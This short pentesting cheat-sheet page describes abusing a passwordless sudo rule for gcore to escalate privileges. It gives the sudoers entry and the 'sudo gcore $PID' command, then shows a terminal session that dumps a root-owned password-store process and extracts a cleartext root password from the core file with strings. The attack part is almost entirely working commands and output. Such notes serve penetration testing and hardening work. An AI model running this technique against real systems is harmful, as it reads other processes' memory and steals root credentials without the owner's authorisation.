---
description: using gcore with sudo privilege for priv esc
---

# gcore

```
(ALL) NOPASSWD: /usr/bin/gcore

sudo gcore $PID
```

Gcore is dumping a process with its PID value. So, if you have enough permission to execute it, you can get cleartext password from the process.

SSH - Low priv user with root access - If you are lucky, the user used root password.

(ps aux - you can see root priv but it is using another user)

You can see an another way to privesc without analyzing ssh service.

```
user@test:/tmp/test$ ps aux | grep root
root       495  0.0  0.0   2276    72 ?        Ss   17:12   0:00 /usr/bin/password-store

user@test:/tmp/test$ sudo gcore 495
sudo gcore 495
0x00007f50a9fce6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffccf6689b0, remaining=remaining@entry=0x7ffccf6689b0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.495
[Inferior 1 (process 495) detached]
user@test:/tmp/test$ strings core.495

001 Password: root:
asfkahsfyafklashcolahsf
```
